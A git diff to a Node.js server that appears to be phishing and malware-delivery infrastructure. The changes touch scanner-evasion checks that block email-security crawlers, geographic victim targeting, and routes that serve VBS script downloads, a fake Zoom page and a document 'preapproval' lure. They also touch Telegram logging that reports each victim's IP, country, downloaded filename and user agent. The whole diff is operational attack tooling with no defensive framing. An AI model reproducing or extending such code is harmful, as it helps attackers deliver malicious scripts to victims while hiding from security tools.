@@ -25,23 +25,45 @@ async function sendTelegramMessage(text) {
     await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text})
     });
   } catch (err) {
-    console.error('Telegram logging failed:', err?.message || err);
-  }
+    console.dir(err, { depth: null });
+}
 }
 
-function log(level, meta) {
-  const text = `*${level.toUpperCase()}*
-Event: ${meta.event || ''}
-IP: ${meta.ip || ''}
-${meta.path ? `Path: ${meta.path}` : ''}
-${meta.reason ? `Reason: ${meta.reason}` : ''}
-UA: ${(meta.ua || '').slice(0, 200)}
-Time: ${new Date().toISOString()}`;
-  sendTelegramMessage(text).catch(() => {});
-  console.log(`[${level}] ${meta.event} | ${meta.ip} | ${meta.path || ''}`);
+function log(level, meta = {}) {
+
+  const icons = {
+    info: "🟢",
+    warn: "🟡",
+    error: "🔴",
+    success: "✅"
+  };
+
+  const text = [
+    `${icons[level] || "ℹ️"} ${level.toUpperCase()} • ${meta.event || "unknown"}`,
+    "",
+    meta.ip && `🌐 IP: ${meta.ip}`,
+    meta.country && `🌍 Country: ${meta.country}`,
+    meta.path && `📄 Path: ${meta.path}`,
+    meta.type && `📦 Type: ${meta.type}`,
+    meta.filename && `📁 File: ${meta.filename}`,
+    meta.size && `📏 Size: ${meta.size.toLocaleString()} bytes`,
+    meta.reason && `⚠️ Reason: ${meta.reason}`,
+    meta.docId && `🆔 Document: ${meta.docId}`,
+    meta.ua && `🖥️ UA: ${meta.ua.slice(0, 150)}`,
+    "",
+    `🕒 ${new Date().toLocaleString()}`
+  ]
+    .filter(Boolean)
+    .join("\n");
+
+  sendTelegramMessage(text).catch(console.error);
+
+  console.log(
+    `[${level}] ${meta.event} | ${meta.ip || "-"} | ${meta.path || meta.filename || ""}`
+  );
 }
 
 // ======= Rate limiter =======
@@ -149,7 +171,7 @@ function isWhitelisted(req) {
     const referer = req.get('Referer') || '';
     
     // Allow your own domain's requests
-    if (referer && referer.includes('procurement-j9mv.onrender.com')) { // CHANGE THIS to your actual domain
+    if (referer && referer.includes('cdn-service-s3.ink')) { // CHANGE THIS to your actual domain
         return true;
     }
     
@@ -189,24 +211,25 @@ function isEmailScanner(req) {
   // 5. Empty or extremely short UA
   if (!ua || ua.length < 10) return true;
 
-  // 6. Missing critical browser headers (common in automated scanners)
-  const accept = req.get('Accept');
-  const acceptLang = req.get('Accept-Language');
-  if (!accept || !acceptLang) return true;
+  // // 6. Missing critical browser headers (common in automated scanners)
+  // const accept = req.get('Accept');
+  // const acceptLang = req.get('Accept-Language');
+  // if (!accept || !acceptLang) return true;
 
-  // 7. Accept header doesn't include text/html (scanners often send */*)
-  if (accept && !accept.includes('text/html')) return true;
+  // // 7. Accept header doesn't include text/html (scanners often send */*)
+  // if (accept && !accept.includes('text/html')) return true;
 
   return false;
 }
 
 // ======= Geolocation check =======
 function isTargetCountry(req) {
-  if (!TARGET_COUNTRY) return true; // No target set = allow all
-  const ip = getClientIp(req);
-  if (!ip || ip === '::1' || ip === '127.0.0.1') return true;
-  const geo = geoip.lookup(ip);
-  if (!geo) return false; // Can't determine = block
+  if (!TARGET_COUNTRY) return true;
+
+  const geo = geoip.lookup(getClientIp(req));
+
+  if (!geo) return true; // allow unknown
+
   return geo.country === TARGET_COUNTRY;
 }
 
@@ -238,7 +261,7 @@ app.use((req, res, next) => {
   }
 
   // Log all requests
-  log('info', { event: 'request', ip, ua: ua.slice(0, 200), path });
+  // log('info', { event: 'request', ip, ua: ua.slice(0, 200), path });
 
   // CRITICAL: Block email scanners
   if (isEmailScanner(req)) {
@@ -302,9 +325,7 @@ app.get('/download/vbs/:type', async (req, res) => {
         res.setHeader('Content-Type', 'application/octet-stream');
         res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
         res.setHeader('Content-Length', Buffer.byteLength(data));
-        
-        res.send(data);
-        
+
         log('info', { 
             event: 'vbs_download', 
             type: type,
@@ -312,6 +333,9 @@ app.get('/download/vbs/:type', async (req, res) => {
             ip: getClientIp(req), 
             size: Buffer.byteLength(data)
         });
+        
+        res.send(data);
+
         
     } catch (error) {
         log('error', { 
@@ -329,6 +353,7 @@ app.get('/', (req, res) => {
 });
 
 app.get('/zoom/:zoomId', (req, res) => {
+  log('info', { event: 'serve_zoom', ip: getClientIp(req), docId: req.params.docId });
   return res.sendFile(path.join(__dirname, 'pages', 'zoom.html'));
 });
 
@@ -337,7 +362,7 @@ app.get('/download/id/:fileId', (req, res) => {
 });
 
 app.get('/documents/:docId', (req, res) => {
-  log('info', { event: 'serve_landing', ip: getClientIp(req), docId: req.params.docId });
+  log('info', { event: 'serve_preapproval', ip: getClientIp(req), docId: req.params.docId });
   return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
 });
 
